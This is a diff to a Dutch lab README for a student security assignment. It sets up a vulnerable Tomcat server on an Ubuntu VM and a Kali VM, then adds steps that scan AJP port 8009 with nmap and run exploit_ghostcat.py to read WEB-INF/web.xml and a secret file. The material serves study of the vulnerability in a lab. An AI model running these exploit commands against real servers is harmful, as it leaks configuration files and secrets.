@@ -37,25 +37,49 @@ Voor alles te deinstalleren voert u het script nog een keer uit in de terminal, 
 
 Nu dat de virtuele machines correct geinstalleerd staan, gaan we beginnen met deze op te starten.
 
-1) Start de Ubuntu VM.
-2) Het wachtwoord is osboxes.org
-3) (indien je wil kan je de instellingen verander voor het toetsenbord zodat het makkelijker is om de commando's uit te voeren)
-      3.1) ga naar instellingen -> toetsenbord -> 
-4) open de terminal en voer de volgende commando's uit
-5) sudo apt install openssh-server -y
-6) sudo systemctl start ssh
-7) sudo systemctl enable ssh
-8) mkdir ghostcat
+START DE UBUNTU VM
+1) Het wachtwoord is osboxes.org
+2) (indien je wil kan je de instellingen verander voor het toetsenbord zodat het makkelijker is om de commando's uit te voeren)
+      2.1) ga naar instellingen -> toetsenbord -> 
+3) open de terminal en voer de volgende commando's uit
+4) sudo apt install openssh-server -y
+5) sudo systemctl start ssh
+6) sudo systemctl enable ssh
+7) mkdir ghostcat
+8) ip a
+
 (kijk welk ip adres de ubuntu vm heeft)
-9) ip a 
 (De 2 bestanden kopieren naar Ubuntu (gebruik jouw eigen pad en ip van de vms))
 
-10) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/bash/setup_tomcat.sh osboxes@[ip adres van de vm]:~/ghostcat/setup_tomcat.sh
-11) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/dockerfile/Dockerfile osboxes@[ip adres van de vm]:~/ghostcat/Dockerfile
+10) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/bash/setup_tomcat.sh osboxes@[ip adres van de ubuntu vm]:~/ghostcat/setup_tomcat.sh
+11) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/dockerfile/Dockerfile osboxes@[ip adres van de ubuntu vm]:~/ghostcat/Dockerfile
 12) chmod +x  setup_tomcat.sh
 13) ./setup_tomcat.sh
+    
 (het ip adres van de ubuntu vm)
-14) curl http://[ip adres van de vm]:8080/
+
+15) curl http://[ip adres van de ubuntu vm]:8080/
+
+START DE KALI VM
+1) Het wachtwoord is osboxes.org
+2) (indien je wil kan je de instellingen verander voor het toetsenbord zodat het makkelijker is om de commando's uit te voeren)
+      2.1) ga naar instellingen -> toetsenbord -> 
+
+3) sudo systemctl start ssh
+4) sudo systemctl enable ssh
+5) ip a
+
+(kijk welk ip adres de ubuntu vm heeft)
+(gebruik jouw eigen pad en ip van de vms)
+
+6) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/python/exploit_ghostcat.py osboxes@[ip adres van de kali vm]:~/exploit_ghostcat.py
+7) chmod +x exploit_ghostcat.py
+8) nmap [ip adres van de ubuntu vm] -p 8009
+
+(Voer de exploit uit:)
+
+9) python3 exploit_ghostcat.py http://[ip adres van de ubuntu vm]:8080/ 8009 /WEB-INF/web.xml read
+10) python3 exploit_ghostcat.py http://[ip adres van de ubuntu vm]:8080/ 8009 /WEB-INF/secret.txt read
 
 ## Rollback-plan: Instructies voor wat te doen als er iets misgaat tijdens de implementatie (bijv. hoe je terug kunt keren naar de vorige versie). Back-upprocedures.
 
